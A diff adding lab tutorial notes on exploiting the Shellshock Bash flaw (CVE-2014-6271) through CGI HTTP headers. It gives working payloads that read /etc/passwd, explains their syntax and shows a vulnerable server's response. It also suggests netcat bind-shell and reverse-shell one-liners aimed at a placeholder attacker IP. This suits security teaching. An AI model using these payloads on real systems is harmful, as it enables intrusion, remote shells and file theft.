@@ -82,6 +82,55 @@ We'll begin by ensuring you have successfully completed the [set up](#set-up) st
 ## Introduction
 
 > :construction: TK-TODO
+>
+> Notes for exploiting CVE-2014-6271 follow.
+
+The HTTP request, in full, should be at a minimum something like this:
+
+```
+GET /cgi-bin/status HTTP/1.0
+User-Agent: () { :; }; echo; /bin/cat /etc/passwd
+```
+
+Here, `/bin/cat /etc/passwd` is the actual payload, though the entire payload is technically the content of the `User-Agent` HTTP header (`() { :; }; echo; /bin/cat /etc/passwd`). Importantly, spacing matters here because Bash is the program interpreting the syntax of the command sequence. Breaking this down:
+
+* `()` is a Bash syntax idiom indicating that what follows should be a function block. A single space, and only a single space, must follow this part.
+* `{` begins the function block. At least one space must follow here, as well, although more than one will also work.
+* `:` is the Bash command for a no-operation. This function is therefore defined syntactically correctly, but does nothing. From this point out, spacing no longer affects triggering CVE-2014-6271 so long as your spacing is valid Bash syntax.
+* `;` ends the do-nothing function command. (Perhaps unintuitively, this cannot be omitted.)
+* `}` ends the function block.
+* Since the function block does nothing, we need follow-on commands to execute. To supply follow-on commands, we end the function declaration statement with its own semicolon `;`.
+* Now, we supply a payload.
+
+Payload construction also matters, but differs depending on what you are doing.
+
+Our simple payload here begins with `echo` and a statement-ending trailing semicolon (`;`) because our HTTP request is using the `GET` verb, and the output we're constructing (the contents of the `/etc/passwd`) file does not syntactically conform to HTTP headers. This would cause the HTTP sever to issue an HTTP 500 Internal Server Error error code instead of completing the request successfuly. So, we echo a blank line, indicating the end of the HTTP response headers and the beginning of the HTTP response body.
+
+Now we simply print out the contents of the file we want using the full path to the `cat` binary (since it is unlikely that we actually have a `PATH` environment variable in the context of the running Web server), and the path to the file. Classic command injection.
+
+We are not limited to the User-Agent HTTP header, either. Any header we supply will work. The following HTTP request will produce the expected output:
+
+```
+GET /cgi-bin/status HTTP/1.0
+Blahblah-DoesntMatter: () { :;}; echo; echo "Hacked!"
+```
+
+Gives us:
+
+```
+HTTP/1.1 200 OK
+Date: Fri, 26 Jun 2020 22:04:50 GMT
+Server: Apache/2.2.21 (Unix) DAV/2
+Connection: close
+Content-Type: text/plain
+
+Hacked!
+Content-Type: application/json
+
+{ "uptime": " 22:04:51 up 54 min, 1 users, load average: 0.00, 0.01, 0.00", "kernel": "Linux vulnerable 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014 i686 GNU/Linux"}
+```
+
+From here, it's simply a matter of figuring out what payload you want and that you can take advantage of in this particular situation. Obvious options include, for instance, a simple bind shell (`nc -l -p 31337 -e /bin/bash`), or a reverse shell (.e.g., `nc <YOUR_IP> 31337 -e /bin/bash`). Be sure to search out bind shell cheat sheets across the Web.
 
 # Discussion
 
